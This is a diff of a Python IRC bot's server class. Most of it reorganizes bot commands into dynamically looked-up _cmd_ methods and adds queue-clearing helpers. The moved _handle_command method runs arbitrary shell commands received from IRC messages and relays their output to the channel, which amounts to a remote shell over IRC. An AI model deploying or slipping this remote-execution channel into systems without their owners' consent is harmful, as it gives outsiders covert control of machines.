@@ -11,6 +11,12 @@ import queue
 import config
 
 class Server():
+    # Order of functions in Server():
+    # - Public API (non underscored functions and __init__)
+    # - Thread targets
+    # - Internal helper functions (message parsing, message handling, etc)
+    # - Bot commands (pid, die, etc)
+
     # Setup the IRC related things such as user details and prefixes
     # This function also sets up the threading events and queues
     def __init__(self, realname, nickname, channels, command_prefix = "$!", bot_prefix = "$$", opper_nicknames = []):
@@ -170,6 +176,50 @@ class Server():
         if self._going_down.is_set():
             print("[RECVTHREAD] Quitting due to thread condition!")
 
+    # This is where we actually run the RCE commands and pipe the output
+    # back to IRC.
+    #
+    # No temp files here
+    def _handle_command(self, cmd, target_channel):
+        print(f"[CMDTHREAD] Running CMD {cmd}!")
+        proc = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, stdin = subprocess.DEVNULL,
+        start_new_session=True, text=False)
+
+        # Calculate maximum message size            
+        # 512 bytes is max IRC message with <IRCv3 and no cap neg
+        msg_without_data = b"PRIVMSG " + target_channel.encode() + b" :" + b"\r\n"
+        max_data_len = 512 - len(msg_without_data)
+        print(f"[CMDTHREAD] Reading from Popen pipe with len = {max_data_len}!")
+
+        while True:
+            # Check for quitting flag
+            if self._going_down.is_set():
+                print("[CMDTHREAD] Quitting due to thread condition!")
+                proc.kill()
+                break
+
+            # Read a line up to max_data_len
+            # Replace invalid chars with escape sequences
+            line = proc.stdout.readline(max_data_len)
+            line = line.decode("utf8", errors = "backslashreplace")
+
+            # Check for empty data
+            if not line:
+                break
+
+            # Remove carraige return to avoid confusing IRC server
+            line = line.replace("\r", "")
+
+            # Strip rouge newlines from data
+            line = line.replace("\r\n", "")
+            line = line.replace("\n", "")
+
+            self.privmsg(target_channel, line)
+
+            # Break if our child exits for any reason
+            if proc.poll():
+                break
+
     # This function sends the user details to the IRC server
     # This isn't in the recv thread as we need to run it twice
     # if the nick is in use.
@@ -186,6 +236,26 @@ class Server():
     def _strip_control_chars(self, text):
         control_char_re = r"[\x00-\x1F\x7F]"
         return re.sub(control_char_re, "*", text)
+
+    # This function clears the send queue by fetching all of the items in a loop 
+    # before the send thread can grab them.
+    def _clear_sendq(self):
+        print(f"[ONESHOTTHREAD] Clearing sendq of size {self._send_q.qsize()}")
+
+        try:
+            while True:
+                self._send_q.get_nowait()
+        except queue.Empty:
+            print("[ONESHOTTHREAD] Queue cleared!")
+            pass
+
+    # This function is used to run a function in a new daemonic thread without waiting.
+    # Used for command handlers, mainly clearsendq to speed up
+    # queue clearning during heavy server load.
+    def _oneshot_thread(self, func, args = []):
+        print(f"[SERVER] Starting oneshot thread for {func} with args = {args}")
+        thread = threading.Thread(target = func, args = args, daemon = True)
+        thread.start()
 
     # This is where the message parsing actually happens
     def _parse_message(self, msg):
@@ -278,20 +348,28 @@ class Server():
                 # Run CMDTHREAD
                 threading.Thread(target = self._handle_command, args = (cmd, msg["target_channel"], )).start()
             elif msg["params"][-1].startswith(self.bot_prefix):
-                # Send message queue size
-                if "sendq" in msg["params"][-1]:
-                    self.privmsg(msg["target_channel"], f"Send Queue Size: {self._send_q.qsize()}")
-                # Send main PID
-                if "pid" in msg["params"][-1]:
-                    self.privmsg(msg["target_channel"], f"Bot PID: {os.getpid()}")
-                # Kill server
-                if "die" in msg["params"][-1]:
-                    # Tear down server
-                    self.die()
-                # Send flooding statistics
-                if "floodstats" in msg["params"][-1]:
-                    self.privmsg(msg["target_channel"], f"Sleep Time: {self._msg_time}")
-                    self.privmsg(msg["target_channel"], f"Message Count: {self._msg_count}")
+                # Get rid of the bot prefix
+                command = msg["params"][-1].strip(self.bot_prefix)
+
+                # Get rid of any leading spaces
+                command = command.strip(" ")
+
+                # Ignore blank commands
+                if not command:
+                    return
+
+                # Lookup command
+                try:
+                    command_func = getattr(self, f"_cmd_{command}")
+                except AttributeError:
+                    # Invalid command
+                    print(f"[RECVTHREAD] _cmd_{command} was not found!")
+                    return
+
+                # Run command
+                print(f"[RECVTHREAD] Running command _cmd_{command}!")
+                command_func(msg)
+
         # Handle nickname already in use by appending the PID
         # and resending user reg
         elif msg["command"] == "433":
@@ -306,49 +384,30 @@ class Server():
                 self._send_q.put(f"JOIN {msg['params'][-1]}\r\n".encode())
                 self.channels.append(msg["params"][-1])
 
-    # This is where we actually run the RCE commands and pipe the output
-    # back to IRC.
-    #
-    # No temp files here
-    def _handle_command(self, cmd, target_channel):
-        print(f"[CMDTHREAD] Running CMD {cmd}!")
-        proc = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, stdin = subprocess.DEVNULL,
-        start_new_session=True, text=False)
 
-        # Calculate maximum message size            
-        # 512 bytes is max IRC message with <IRCv3 and no cap neg
-        msg_without_data = b"PRIVMSG " + target_channel.encode() + b" :" + b"\r\n"
-        max_data_len = 512 - len(msg_without_data)
-        print(f"[CMDTHREAD] Reading from Popen pipe with len = {max_data_len}!")
+    # These are where bot commands are implemented
+    # The format is _cmd_NAMEOFCOMMAND and it gets the class instance and the triggering message as parameters.
+    # The functions are looked up dynamically in _handle_message and executed.
+    def _cmd_help(self, msg):
+        for line in [f"Current bot prefix: {self.bot_prefix}", f"Current RCE prefix: {self.command_prefix}"]:
+            self.privmsg(msg["target_channel"], line)
 
-        while True:
-            # Check for quitting flag
-            if self._going_down.is_set():
-                print("[CMDTHREAD] Quitting due to thread condition!")
-                proc.kill()
-                break
+    def _cmd_sendqlen(self, msg):
+        self.privmsg(msg["target_channel"], f"Send Queue Size: {self._send_q.qsize()}")
 
-            # Read a line up to max_data_len
-            # Replace invalid chars with escape sequences
-            line = proc.stdout.readline(max_data_len)
-            line = line.decode("utf8", errors = "backslashreplace")
+    def _cmd_pid(self, msg):
+        self.privmsg(msg["target_channel"], f"Bot PID: {os.getpid()}")
 
-            # Check for empty data
-            if not line:
-                break
+    def _cmd_die(self, msg):
+        # Tear down server
+        self.die()
 
-            # Remove carraige return to avoid confusing IRC server
-            line = line.replace("\r", "")
+    def _cmd_floodstats(self, msg):
+        self.privmsg(msg["target_channel"], f"Sleep Time: {self._msg_time}")
+        self.privmsg(msg["target_channel"], f"Message Count: {self._msg_count}")
 
-            # Strip rouge newlines from data
-            line = line.replace("\r\n", "")
-            line = line.replace("\n", "")
-
-            self.privmsg(target_channel, line)
-
-            # Break if our child exits for any reason
-            if proc.poll():
-                break
+    def _cmd_clearsendq(self, msg):
+        self._oneshot_thread(self._clear_sendq)
 
 if __name__ == "__main__":
     serv = Server(**config.user, **config.bot)
